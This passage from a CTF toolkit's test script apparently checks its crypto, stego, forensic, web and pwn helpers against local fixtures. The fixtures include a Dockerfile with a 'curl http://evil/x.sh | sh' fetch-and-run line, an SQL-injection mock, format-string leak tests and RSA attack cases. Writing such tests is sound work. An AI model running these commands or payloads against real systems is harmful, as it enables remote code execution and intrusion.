    r = run("crypto/obscure.py", "bacon", "--text", bacon)
    check("crypto/obscure.py bacon", bl in r.stdout, r.stdout + r.stderr)

    # 70. base58
    B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

    def b58enc(data):
        n = int.from_bytes(data, "big")
        s = ""
        while n:
            n, rem = divmod(n, 58)
            s = B58[rem] + s
        return "1" * (len(data) - len(data.lstrip(b"\x00"))) + s

    r = run("crypto/obscure.py", "base58", "--text", b58enc(ws_flag.encode()))
    check("crypto/obscure.py base58", ws_flag in r.stdout, r.stdout + r.stderr)

    # 71. документ DOCX, внутри Whitespace
    doc_flag = "CTF{doc}"
    prog = "".join(ws_push(ord(c)) + ws_out() for c in doc_flag)
    docx = os.path.join(tmp, "d.docx")
    with zipfile.ZipFile(docx, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml",
                   '<w:document><w:t xml:space="preserve">' + prog + "</w:t></w:document>")
    r = run("triage.py", docx)
    check("triage.py docx whitespace", "whitespace-only" in r.stdout, r.stdout + r.stderr)

    extracted = os.path.join(tmp, "doc.txt")
    r = run("doctext.py", docx, "--out", extracted)
    check("doctext.py docx", os.path.exists(extracted), r.stdout + r.stderr)
    r = run("stego/whitespace.py", extracted, "--mode", "ws")
    check("docx -> ws", doc_flag in r.stdout, r.stdout + r.stderr)

    # 72. zero-width в обычном тексте
    zw2 = os.path.join(tmp, "zw2.txt")
    open(zw2, "w", encoding="utf-8").write(
        "".join("\u200b" if b == "0" else "\u200c"
                for b in "".join(f"{ord(c):08b}" for c in doc_flag)))
    r = run("triage.py", zw2)
    check("triage.py zero-width", "zero-width" in r.stdout, r.stdout + r.stderr)

    # 73. auto на документе советует ws
    r = run("toolbox.py", "auto", docx)
    check("toolbox.py auto docx", "whitespace-only" in r.stdout and "ws" in r.stdout,
          r.stdout + r.stderr)

    # 73b. auto: ZIP спрятан в середине файла (обрезанный том) — сразу флаг
    frag = os.path.join(tmp, "volume.bin")
    zbuf = io.BytesIO()
    with zipfile.ZipFile(zbuf, "w") as z:
        z.writestr("dispatch.txt", "CTF{inside_volume}\n")
    with open(frag, "wb") as f:
        f.write(b"STORAGE " + b"\x00" * 300 + zbuf.getvalue())
    r = run("toolbox.py", "auto", frag)
    check("toolbox.py auto embedded-zip",
          "CTF{inside_volume}" in r.stdout and "смещению" in r.stdout,
          r.stdout + r.stderr)

    # 73c. auto: JSON-отказ API вместо файла
    denial_json = os.path.join(tmp, "denied_api.json")
    open(denial_json, "w", encoding="utf-8").write(
        '{"code":"ACCESS_DENIED","error":"open task page"}')
    r = run("toolbox.py", "auto", denial_json)
    check("toolbox.py auto api-denial", "ответ API" in r.stdout, r.stdout + r.stderr)

    # 74. megarev: PE
    r = run("reverse/megarev.py", "--file", PY)
    check("reverse/megarev.py PE", "PE" in r.stdout, r.stdout[-500:] + r.stderr)

    # 75. megarev: pyc + XOR-флаг
    import py_compile
    src = os.path.join(tmp, "rev.py")
    open(src, "w").write("KEY = 'secretkey'\n\ndef check(x):\n    return x == 'nope'\n")
    pyc = os.path.join(tmp, "rev.pyc")
    py_compile.compile(src, cfile=pyc, doraise=True)
    rev_flag = b"CTF{rev_mega}"
    rev_key = b"secretkey"
    with open(pyc, "ab") as f:
        f.write(bytes(c ^ rev_key[i % len(rev_key)] for i, c in enumerate(rev_flag)))
    r = run("reverse/megarev.py", "--file", pyc)
    check("reverse/megarev.py pyc", rev_flag.decode() in r.stdout, r.stdout[-800:] + r.stderr)

    # 76. docker image: whiteouts + секреты
    def layer(files):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as t:
            for n, d in files.items():
                ti = tarfile.TarInfo(n)
                ti.size = len(d)
                t.addfile(ti, io.BytesIO(d))
        return buf.getvalue()

    l1 = layer({"app/secret.txt": b"PASSWORD=hiddenpass\n",
                "app/deleted.txt": b"CTF{docker_layer}\n"})
    l2 = layer({"app/.wh.deleted.txt": b""})
    image = os.path.join(tmp, "image.tar")
    with tarfile.open(image, "w") as t:
        def add(name, data):
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))

        add("manifest.json", json.dumps([{
            "Config": "config.json", "RepoTags": ["a:latest"],
            "Layers": ["l1/layer.tar", "l2/layer.tar"]}]).encode())
        add("config.json", json.dumps({
            "config": {"Env": ["PASSWORD=supersecret"], "Cmd": ["/app"]},
            "history": [{"created_by": "RUN export TOKEN=abcdef"}]}).encode())
        add("l1/layer.tar", l1)
        add("l2/layer.tar", l2)
    r = run("forensic/docker_image.py", image)
    check("forensic/docker_image.py",
          "CTF{docker_layer}" in r.stdout and "hiddenpass" in r.stdout
          and "deleted" in r.stdout, r.stdout[-800:] + r.stderr)

    # 77. dockerfile audit
    df = os.path.join(tmp, "Dockerfile")
    open(df, "w").write("FROM ubuntu\nENV PASSWORD=secret123\n"
                        "ADD http://evil/x.sh /x.sh\nRUN curl http://evil/x.sh | sh\n")
    r = run("forensic/docker_image.py", df, "--dockerfile")
    check("forensic/docker_image.py dockerfile",
          "latest" in r.stdout or "секрет" in r.stdout, r.stdout + r.stderr)

    # 78. git_hunt
    repo = os.path.join(tmp, "repo")
    os.makedirs(repo)
    subprocess.run(["git", "-C", repo, "init", "-q"], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.email", "a@b.c"], check=True)
    subprocess.run(["git", "-C", repo, "config", "user.name", "a"], check=True)
    gf = os.path.join(repo, "secret.txt")
    open(gf, "w").write("CTF{git_history}\n")
    subprocess.run(["git", "-C", repo, "add", "."], check=True)
    subprocess.run(["git", "-C", repo, "commit", "-qm", "one"], check=True)
    os.remove(gf)
    subprocess.run(["git", "-C", repo, "add", "-A"], check=True)
    subprocess.run(["git", "-C", repo, "commit", "-qm", "two"], check=True)
    r = run("forensic/git_hunt.py", repo)
    check("forensic/git_hunt.py", "CTF{git_history}" in r.stdout and "secret.txt" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 79. browser artifacts
    hist = os.path.join(tmp, "History")
    con = sqlite3.connect(hist)
    con.execute("create table urls(url text, title text, visit_count int, last_visit_time int)")
    con.execute("insert into urls values('http://x/CTF{browser}','t',1,0)")
    con.commit(); con.close()
    r = run("forensic/browser_artifacts.py", hist)
    check("forensic/browser_artifacts.py", "CTF{browser}" in r.stdout, r.stdout + r.stderr)

    # 80. windows triage
    winp = os.path.join(tmp, "NTUSER.DAT")
    open(winp, "wb").write("Run C:\\evil.exe".encode("utf-16le") + b"\x00CTF{win_reg}\x00")
    r = run("forensic/windows_triage.py", winp)
    check("forensic/windows_triage.py", "CTF{win_reg}" in r.stdout, r.stdout + r.stderr)

    # 81. office macros
    docm = os.path.join(tmp, "m.docx")
    with zipfile.ZipFile(docm, "w") as z:
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"CTF{macro}")
    r = run("forensic/office_docs.py", docm)
    check("forensic/office_docs.py", "CTF{macro}" in r.stdout and "vbaProject" in r.stdout,
          r.stdout[-500:] + r.stderr)

    # 82. cloud creds
    cloudp = os.path.join(tmp, "creds.txt")
    open(cloudp, "w").write("AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\n"
                            "aws_secret_access_key=" + "A" * 40 + "\n")
    r = run("forensic/cloud_creds.py", cloudp)
    check("forensic/cloud_creds.py", "AKIAABCDEFGHIJKLMNOP" in r.stdout, r.stdout + r.stderr)

    # 83. DTMF
    dtmf_wav = os.path.join(tmp, "dtmf.wav")
    freqs = {"1": (697, 1209), "2": (697, 1336), "3": (697, 1477)}
    rate = 8000
    samples = []
    for d in "123":
        f1, f2 = freqs[d]
        for i in range(int(rate * 0.2)):
            samples.append(int(8000 * (math.sin(2 * math.pi * f1 * i / rate) +
                                       math.sin(2 * math.pi * f2 * i / rate))))
        samples += [0] * int(rate * 0.05)
    with wave.open(dtmf_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(rate)
        w.writeframes(b"".join(struct.pack("<h", s) for s in samples))
    r = run("stego/audio_tools.py", dtmf_wav, "--mode", "dtmf")
    check("stego/audio_tools.py dtmf", "123" in r.stdout, r.stdout + r.stderr)

    # 83b. audio_tools: морзе из формы волны (точки/тире разной длины)
    a_rate = 22050
    dot = int(a_rate * 0.08)
    samples = []

    def _tone(n):
        samples.extend(int(6000 * math.sin(2 * math.pi * 700 * i / a_rate)) for i in range(n))

    def _sil(n):
        samples.extend([0] * n)

    pattern = {"S": "...", "O": "---"}
    for ch in "SOS":
        for sym in pattern[ch]:
            _tone(dot if sym == "." else dot * 3)
            _sil(dot)
        _sil(dot * 2)
    morse_wav = os.path.join(tmp, "morse.wav")
    with wave.open(morse_wav, "w") as w:
        w.setnchannels(1); w.setsampwidth(2); w.setframerate(a_rate)
        w.writeframes(b"".join(struct.pack("<h", s) for s in samples))
    r = run("stego/audio_tools.py", morse_wav, "--raw")
    check("stego/audio_tools.py morse", "SOS" in r.stdout, r.stdout + r.stderr)

    # 83c. audio_tools: вместо WAV прилетел JSON-отказ API — без трейсбека
    notwav = os.path.join(tmp, "denied.wav")
    open(notwav, "w", encoding="utf-8").write('{"code":"ACCESS_DENIED","error":"open task page"}')
    r = run("stego/audio_tools.py", notwav)
    check("stego/audio_tools.py not-wav",
          r.returncode == 0 and "не WAV" in r.stdout and "Traceback" not in r.stderr,
          r.stdout + r.stderr)

    # 83d. triage: JSON-отказ API распознаётся как «файл не скачался»
    r = run("triage.py", notwav)
    check("triage.py api-denial", "ответ API" in r.stdout, r.stdout[:400] + r.stderr)

    # 84. lang info (Go)
    gop = os.path.join(tmp, "go.bin")
    open(gop, "wb").write(b"\x7fELF\x02\x01\x01" + b"\x00" * 9
                          + b"junk .go.buildinfo go1.22.0 path\tmain")
    r = run("reverse/lang_info.py", gop)
    check("reverse/lang_info.py", "Go" in r.stdout, r.stdout + r.stderr)

    # 85. RSA wiener
    p, q = 1009, 1013
    n_w = p * q
    phi = (p - 1) * (q - 1)
    d_w = 5
    e_w = pow(d_w, -1, phi)
    m_w = 123
    c_w = pow(m_w, e_w, n_w)
    r = run("crypto/rsa_tool.py", "wiener", "--n", str(n_w), "--e", str(e_w),
            "--cipher", str(c_w))
    check("crypto/rsa_tool.py wiener", f"d={d_w}" in r.stdout and str(m_w) in r.stdout,
          r.stdout + r.stderr)

    # 86. RSA broadcast
    m_b = 100
    pairs = []
    for p1, q1 in ((1009, 1013), (1019, 1021), (1031, 1033)):
        n1 = p1 * q1
        pairs += ["--pairs", f"{n1}:{pow(m_b, 3, n1)}"]
    r = run("crypto/rsa_tool.py", "broadcast", "--e", "3", *pairs)
    check("crypto/rsa_tool.py broadcast", "int : 100" in r.stdout or "int: 100" in r.stdout,
          r.stdout + r.stderr)

    # 87. flag_hunt: flag.txt, flag_<random>, содержимое
    fdir = os.path.join(tmp, "flags")
    os.makedirs(fdir, exist_ok=True)
    open(os.path.join(fdir, "flag.txt"), "w").write("CTF{flag_file}")
    open(os.path.join(fdir, "flag_sdfgjdo348932idfgj"), "w").write("nothing")
    open(os.path.join(fdir, "note.txt"), "w").write("here CTF{inside_note}")
    open(os.path.join(fdir, "normal.txt"), "w").write("hello")
    r = run("forensic/flag_hunt.py", fdir)
    check("forensic/flag_hunt.py",
          "flag.txt" in r.stdout and "flag_sdfgjdo348932idfgj" in r.stdout
          and "CTF{inside_note}" in r.stdout, r.stdout + r.stderr)

    # 88. param_probe: SQLi в поиске отдаёт скрытые записи с флагом
    import http.server
    import threading
    import urllib.parse as _up

    class _SqlHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            q = _up.parse_qs(_up.urlparse(self.path).query)
            val = " ".join(q.get("q", [""]))
            body = "<html>no results for " + val + "</html>"
            if "OR 1=1" in val:
                body = "<html>all records: ... CTF{sqli_bypass}</html>"
            data = body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), _SqlHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        url = f"http://127.0.0.1:{srv.server_address[1]}/?q=0"
        r = run("web/param_probe.py", url)
        check("web/param_probe.py sqli",
              "CTF{sqli_bypass}" in r.stdout, r.stdout[:800] + r.stderr)
    finally:
        srv.shutdown()

    # 89. oracle: gcd-сервис, 5 раундов -> флаг
    import socket as _sock
    import threading as _thr

    _srv = _sock.socket()
    _srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
    _srv.bind(("127.0.0.1", 0))
    _srv.listen(1)
    _port = _srv.getsockname()[1]
    _pairs = [(3, 5), (4, 6), (7, 11), (9, 12), (13, 17)]

    def _oracle_server():
        c, _ = _srv.accept()
        try:
            for a, b in _pairs:
                c.sendall(f"{a} {b}\n".encode())
                ans = c.recv(64).decode().strip()
                want = "YES" if math.gcd(a, b) == 1 else "NO"
                if ans != want:
                    c.sendall(b"WRONG\n")
                    return
            c.sendall(b"CTF{oracle_ok}\n")
        finally:
            c.close()
            _srv.close()

    _thr.Thread(target=_oracle_server, daemon=True).start()
    r = run("pwn/oracle.py", "--connect", f"127.0.0.1:{_port}",
            "--match", r"(\d+) +(\d+)", "--expr", "gcd(a, b) == 1",
            "--send-expr", "'YES' if v else 'NO'", "--repeat", "10")
    check("pwn/oracle.py gcd",
          "CTF{oracle_ok}" in r.stdout and "раундов с ответом: 5" in r.stdout,
          r.stdout + r.stderr)

    # 90. megarev: короткий числовой PIN рядом со словом
    pinbin = os.path.join(tmp, "pin.bin")
    with open(pinbin, "wb") as f:
        f.write(b"\x00" * 64 + b"Enter PIN: \x00\x00" + b"482917\x00" + b"Denied\x00")
    r = run("reverse/megarev.py", pinbin)
    check("reverse/megarev.py secret-like",
          "482917" in r.stdout and "возможный" in r.stdout,
          r.stdout[-800:] + r.stderr)

    # 91. fmtstr scan: эхо-сервис, поиск индексов и %N$s
    fs_srv = os.path.join(tmp, "fs_srv.py")
    with open(fs_srv, "w", encoding="utf-8") as f:
        f.write(
            "import re, sys\n"
            "sys.stdout.write('echo> '); sys.stdout.flush()\n"
            "line = sys.stdin.readline()\n"
            "out = []\n"
            "for n, kind in re.findall(r'%(\\d+)\\$(p|s)', line):\n"
            "    if kind == 'p':\n"
            "        out.append('0x%x' % (0x4142434445464748 if n == '3'\n"
            "                              else 0x7ffd12340000 + int(n)))\n"
            "    else:\n"
            "        out.append('CTF{fmt_scan}' if n == '5' else 'x')\n"
            "sys.stdout.write('|'.join(out) + '\\n'); sys.stdout.flush()\n"
        )
    r = run("pwn/fmtstr.py", "scan", "--local", f"{sys.executable} {fs_srv}",
            "--count", "8", "--deref")
    check("pwn/fmtstr.py scan",
          "CTF{fmt_scan}" in r.stdout and "ascii='HGFEDCBA'" in r.stdout,
          r.stdout[-900:] + r.stderr)

    # 92. solve: автопилот — XOR-блоб и архив внутри файла
    sx = os.path.join(tmp, "solve_xor.bin")
    skey = b"k3y!"
    sdata = b"CTF{solve_auto} " + b"padding " * 4
    with open(sx, "wb") as f:
        f.write(bytes(c ^ skey[i % len(skey)] for i, c in enumerate(sdata)))
    r = run("solve.py", sx, "--time", "30")
    se = os.path.join(tmp, "solve_emb.bin")
    _zb = io.BytesIO()
    with zipfile.ZipFile(_zb, "w") as z:
        z.writestr("note.txt", "CTF{solve_zip}\n")
    with open(se, "wb") as f:
        f.write(b"JUNK" * 80 + _zb.getvalue())
    r2 = run("solve.py", se, "--time", "40")
    check("solve.py auto",
          "CTF{solve_auto}" in r.stdout and "CTF{solve_zip}" in r2.stdout,
          r.stdout[-500:] + r2.stdout[-700:] + r.stderr + r2.stderr)

    # 92b. solve: короткий текст должен доходить до autocrack (бюджет подшагов)
    ca = os.path.join(tmp, "solve_caesar.txt")
    ca_plain = "CTF{solve_caesar}"

    def _rot(ch, k):
        if ch.isupper():
            return chr((ord(ch) - 65 + k) % 26 + 65)
        if ch.islower():
            return chr((ord(ch) - 97 + k) % 26 + 97)
        return ch

    ca_cipher = "".join(_rot(c, 11) for c in ca_plain)
    with open(ca, "w", encoding="utf-8") as f:
        f.write(ca_cipher)
    r3 = run("solve.py", ca, "--time", "40")
    check("solve.py caesar", ca_plain in r3.stdout, r3.stdout[-600:] + r3.stderr)

    # 92c. solve: PEM-ключ + cipher.bin рядом
    from Crypto.PublicKey import RSA as _RK
    from Crypto.Util.number import getPrime as _gp
    pem_dir = os.path.join(tmp, "pem_solve")
    os.makedirs(pem_dir, exist_ok=True)
    _p = _gp(256)
    _n = _p * 10007
    _pub = _RK.construct((_n, 65537))
    with open(os.path.join(pem_dir, "public.pem"), "wb") as f:
        f.write(_pub.export_key())
    _m = int.from_bytes(b"CTF{pem_solve}", "big")
    _c = pow(_m, 65537, _n)
    with open(os.path.join(pem_dir, "cipher.bin"), "wb") as f:
        f.write(_c.to_bytes((_c.bit_length() + 7) // 8, "big"))
    r4 = run("solve.py", pem_dir, "--time", "40")
    check("solve.py pem", "CTF{pem_solve}" in r4.stdout, r4.stdout[-700:] + r4.stderr)

    # 92d. solve: utf-16 файл должен дойти до enc
    u16 = os.path.join(tmp, "solve_utf16.bin")
    with open(u16, "wb") as f:
        f.write("CTF{solve_utf16}".encode("utf-16-le"))
    r5 = run("solve.py", u16, "--time", "30")
    check("solve.py utf16", "CTF{solve_utf16}" in r5.stdout, r5.stdout[-600:] + r5.stderr)

    # 93. recon: комментарии, JWT, robots, base64 в JS
    class _ReconHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/robots.txt":
                body = b"User-agent: *\nDisallow: /secret\n# CTF{robots_flag}\n"
            else:
                body = (b"<html><script>var b='Q1RGe2pzX2I2NH0=';</script>"
                        b"<!-- CTF{comment_flag} -->"
                        b"<form action='/login' method='post'><input name='u'></form>"
                        b"</body></html>")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Set-Cookie",
                             "session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    _srv2 = http.server.HTTPServer(("127.0.0.1", 0), _ReconHandler)
    threading.Thread(target=_srv2.serve_forever, daemon=True).start()
    try:
        r = run("web/recon.py", f"http://127.0.0.1:{_srv2.server_address[1]}/")
        check("web/recon.py",
              "CTF{comment_flag}" in r.stdout and "'sub': 'admin'" in r.stdout
              and "CTF{robots_flag}" in r.stdout and "/login" in r.stdout
              and "CTF{js_b64}" in r.stdout, r.stdout[-900:] + r.stderr)
    finally:
        _srv2.shutdown()

    # 94. auto по папке: типы, флаги, план
    _dd = os.path.join(tmp, "autodir")
    os.makedirs(_dd, exist_ok=True)
    open(os.path.join(_dd, "a.txt"), "w", encoding="utf-8").write("hi CTF{dir_auto}")
    r = run("toolbox.py", "auto", _dd)
    check("toolbox.py auto dir",
          "CTF{dir_auto}" in r.stdout and "solve" in r.stdout, r.stdout[:800] + r.stderr)

    # 95. enc: морзе текстом и алфавит из двух символов
    r = run("enc.py", ".... . .-.. .-.. --- / .-- --- .-. .-.. -..")
    check("enc.py morse-text", "HELLO WORLD" in r.stdout, r.stdout + r.stderr)
    bits = "".join(f"{ord(c):08b}" for c in "CTF{two}")
    two = bits.replace("0", ".").replace("1", "-")
    r = run("enc.py", two)
    check("enc.py 2sym", "CTF{two}" in r.stdout, r.stdout + r.stderr)

    # 96. hint: разбор с объяснением
    r = run("toolbox.py", "hint", "Q1RGe2ZsYWd9")
    check("toolbox.py hint",
          "CTF{flag}" in r.stdout and "как это понимать" in r.stdout,
          r.stdout[-600:] + r.stderr)

    # 97. enc: «кракозябры» — это кодировка, а не шифр
    moji = "Привет, CTF{enc}".encode("utf-8").decode("latin-1")
    moji_file = os.path.join(tmp, "moji.txt")
    with open(moji_file, "w", encoding="utf-8") as f:
        f.write(moji)
    r = run("enc.py", "--file", moji_file)
    check("enc.py mojibake", "Привет" in r.stdout, r.stdout[:400] + r.stderr)

    # 98. rsa auto: числа из текста, Ферма и малая экспонента
    p_a, q_a = 4294967291, 4294967279
    n_a = p_a * q_a
    e_a = 65537
    m_a = int.from_bytes(b"CTF{rsa}", "big")
    c_a = pow(m_a, e_a, n_a)
    rsa_file = os.path.join(tmp, "rsa_task.txt")
    with open(rsa_file, "w", encoding="utf-8") as f:
        f.write(f"The key:\nn = {n_a}\ne = {e_a}\nc = {c_a}\n")
    r = run("crypto/rsa_tool.py", "auto", rsa_file)
    small_e_file = os.path.join(tmp, "rsa_small_e.txt")
    m2 = int.from_bytes(b"hi", "big")
    with open(small_e_file, "w", encoding="utf-8") as f:
        f.write(f"e = 3\nn = {n_a}\nc = {m2 ** 3}\n")
    r2 = run("crypto/rsa_tool.py", "auto", small_e_file)
    check("crypto/rsa_tool.py auto",
          "CTF{rsa}" in r.stdout and "'hi'" in r2.stdout,
          r.stdout[-600:] + r2.stdout[-400:] + r.stderr)

    # 98b. rsa auto: утечка dp, smallq, n=p^k, e=1 (идеи из RsaCtfTool)
    from Crypto.Util.number import getPrime
    pz, qz = getPrime(256), getPrime(256)
    nz = pz * qz
    phz = (pz - 1) * (qz - 1)
    dz = pow(65537, -1, phz)
    mz = int.from_bytes(b"CTF{dp_leak}", "big")
    cz = pow(mz, 65537, nz)
    dp_file = os.path.join(tmp, "rsa_dp.txt")
    with open(dp_file, "w", encoding="utf-8") as f:
        f.write(f"n = {nz}\ne = 65537\ndp = {dz % (pz - 1)}\nc = {cz}\n")
    r = run("crypto/rsa_tool.py", "auto", dp_file)
    check("rsa auto dp leak", "CTF{dp_leak}" in r.stdout, r.stdout[-600:] + r.stderr)

    r = run("crypto/rsa_tool.py", "dp-leak", "--n", str(nz), "--e", "65537",
            "--dp", str(dz % (pz - 1)), "--cipher", str(cz))
    check("rsa dp-leak cmd", "CTF{dp_leak}" in r.stdout, r.stdout[-600:] + r.stderr)

    ps = getPrime(512)
    ns = ps * 10007
    msq = int.from_bytes(b"CTF{smallq}", "big")
    csq = pow(msq, 65537, ns)
    sq_file = os.path.join(tmp, "rsa_smallq.txt")
    with open(sq_file, "w", encoding="utf-8") as f:
        f.write(f"n = {ns}\ne = 65537\nc = {csq}\n")
    r = run("crypto/rsa_tool.py", "auto", sq_file)
    check("rsa auto smallq", "CTF{smallq}" in r.stdout, r.stdout[-600:] + r.stderr)

    pp = getPrime(128)
    npp = pp ** 3
    epp = 65537 if ((pp - 1) * pp * pp) % 65537 else 3
    mpp = int.from_bytes(b"CTF{ppow}", "big")
    cpp = pow(mpp, epp, npp)
    pp_file = os.path.join(tmp, "rsa_ppow.txt")
    with open(pp_file, "w", encoding="utf-8") as f:
        f.write(f"n = {npp}\ne = {epp}\nc = {cpp}\n")
    r = run("crypto/rsa_tool.py", "auto", pp_file)
    check("rsa auto perfect power", "CTF{ppow}" in r.stdout, r.stdout[-600:] + r.stderr)

    me = int.from_bytes(b"CTF{e_one}", "big")
    e1_file = os.path.join(tmp, "rsa_e1.txt")
    with open(e1_file, "w", encoding="utf-8") as f:
        f.write(f"n = {nz}\ne = 1\nc = {me}\n")
    r = run("crypto/rsa_tool.py", "auto", e1_file)
    check("rsa auto e=1", "CTF{e_one}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 98c. rsa auto: PEM public (слабый n) и приватный ключ
    from Crypto.PublicKey import RSA as _RSAKey
    pwp = getPrime(256)
    nwp = pwp * 10007
    mwp = int.from_bytes(b"CTF{pem_pub}", "big")
    cwp = pow(mwp, 65537, nwp)
    pub = _RSAKey.construct((nwp, 65537))
    pem_file = os.path.join(tmp, "weak_public.pem")
    with open(pem_file, "wb") as f:
        f.write(pub.export_key())
    r = run("crypto/rsa_tool.py", "auto", pem_file, "--cipher", str(cwp))
    check("rsa auto pem public", "CTF{pem_pub}" in r.stdout, r.stdout[-600:] + r.stderr)

    kp = _RSAKey.generate(1024)
    mpr = int.from_bytes(b"CTF{pem_priv}", "big")
    cpr = pow(mpr, kp.e, kp.n)
    priv_file = os.path.join(tmp, "private.pem")
    with open(priv_file, "wb") as f:
        f.write(kp.export_key())
    r = run("crypto/rsa_tool.py", "auto", priv_file, "--cipher", str(cpr))
    check("rsa auto pem private", "CTF{pem_priv}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 99. solve: JWT-шаг для текста с токеном
    jwt_txt = os.path.join(tmp, "jwt.txt")
    tok = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYmMifQ.sig123456"
    with open(jwt_txt, "w", encoding="utf-8") as f:
        f.write("Authorization: Bearer " + tok + "\nnote: nothing\n")
    r = run("solve.py", jwt_txt, "--time", "20")
    check("solve.py jwt step", "JWT в тексте" in r.stdout, r.stdout[-700:] + r.stderr)

    # 100. vigenere-crack: флаг в начале текста не ломает ключ
    key_v = "qzlmw"
    plain_v = "CTF{vig} " + "the quick brown fox jumps over the lazy dog " * 6
    ct_v, ki = [], 0
    for ch in plain_v:
        if "a" <= ch <= "z":
            ct_v.append(chr((ord(ch) - 97 + ord(key_v[ki % len(key_v)]) - 97) % 26 + 97))
            ki += 1
        elif "A" <= ch <= "Z":
            ct_v.append(chr((ord(ch) - 65 + ord(key_v[ki % len(key_v)]) - 97) % 26 + 65))
            ki += 1
        else:
            ct_v.append(ch)
    r = run("crypto/classical.py", "vigenere-crack", "--text", "".join(ct_v))
    check("classical vigenere-crack flag", "CTF{vig}" in r.stdout, r.stdout[:400] + r.stderr)

    # 101. lsb --channel all: данные в одном канале всё равно находятся
    lsb_r = os.path.join(tmp, "lsb_r.png")
    write_png_with_lsb(lsb_r, b"CTF{lsb_r}")
    r = run("stego/lsb.py", lsb_r)
    check("stego/lsb.py per-channel", "CTF{lsb_r}" in r.stdout, r.stdout[:500] + r.stderr)

    # 102. rsa shared + SHA256-поток из одного JSON
    import hashlib as _hl
    p_s, q_s = 18446744073709551557, 18446744073709551533
    n_t = p_s * q_s
    key_s = b"session1"
    nonce_s = bytes(range(12))
    flag_s = "CTF{wrap_stream}"
    ct_s = bytearray()
    for i in range(0, len(flag_s), 32):
        ks = _hl.sha256(key_s + nonce_s + (i // 32).to_bytes(4, "big")).digest()
        ct_s += bytes(a ^ b for a, b in zip(flag_s.encode()[i:i + 32], ks))
    reg = {
        "target": "target-1",
        "public_exponent": 65537,
        "certificates": [
            {"id": "target-1", "n": str(n_t)},
            {"id": "other-1", "n": str(p_s * 4294967291)},
            {"id": "other-2", "n": str(18446744073709551551 * 4294967279)},
        ],
        "wrapped_session_key": str(pow(int.from_bytes(key_s, "big"), 65537, n_t)),
        "nonce": nonce_s.hex(),
        "ciphertext": bytes(ct_s).hex(),
    }
    reg_path = os.path.join(tmp, "registry.json")
    with open(reg_path, "w", encoding="utf-8") as f:
        json.dump(reg, f)
    r = run("crypto/rsa_tool.py", "shared", "--json", reg_path, "--target", "target-1",
            "--e", "65537", "--cipher-field", "wrapped_session_key")
    check("rsa shared+stream", "CTF{wrap_stream}" in r.stdout, r.stdout[-600:] + r.stderr)

    # 103. disasm: разбор себя (PE) и строковые ссылки
    r = run("reverse/disasm.py", PY, "--interesting", "--limit", "30")
    check("reverse/disasm.py", "0x" in r.stdout and ("call" in r.stdout or "mov" in r.stdout),
          r.stdout[:500] + r.stderr)

    # 104. oracle: пресет coprime на локальном сервисе
    import time as _time
    srv_path = os.path.join(tmp, "srv_coprime.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket, random, math\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31571)); s.listen(1)\n"
            "c,_=s.accept(); f=c.makefile('rwb')\n"
            "f.write(b'rounds\\n'); f.flush()\n"
            "ok=True\n"
            "for _ in range(4):\n"
            "    a=random.randint(2000,25000); b=random.randint(2000,25000)\n"
            "    f.write(f'{a} {b}\\n'.encode()); f.flush()\n"
            "    want='YES' if math.gcd(a,b)==1 else 'NO'\n"
            "    if f.readline().decode().strip()!=want: ok=False; break\n"
            "f.write(b'CTF{coprime_ok}\\n' if ok else b'CTF{fail}\\n'); f.flush()\n"
            "c.close(); s.close()\n")
    import subprocess as _sp
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/oracle.py", "--connect", "127.0.0.1:31571", "--preset", "coprime",
                "--repeat", "8")
        check("oracle --preset coprime", "CTF{coprime_ok}" in r.stdout,
              r.stdout[-600:] + r.stderr)
    finally:
        srv.terminate()

    # 105. fmtstr auto: перебор %N$s по индексам
    srv_path = os.path.join(tmp, "srv_fmt.py")
    with open(srv_path, "w", encoding="utf-8") as f:
        f.write(
            "import socket\n"
            "s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
            "s.bind(('127.0.0.1',31572)); s.listen(20)\n"
            "for _ in range(6):\n"
            "    c,_=s.accept(); c.recv(200)\n"
            "    c.sendall(b'CTF{fmt_leak}\\n' if c else b'')\n"
            "    c.close()\n"
            "s.close()\n")
    srv = _sp.Popen([PY, srv_path], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    try:
        _time.sleep(1.0)
        r = run("pwn/fmtstr.py", "auto", "--connect", "127.0.0.1:31572",
                "--count", "4", "--timeout", "2")
        check("fmtstr auto", "CTF{fmt_leak}" in r.stdout, r.stdout[-600:] + r.stderr)
    finally:
        srv.terminate()

    # 106. aes auto: ключ строкой в бинарнике, CBC + нулевой IV
    from Crypto.Cipher import AES as _AES
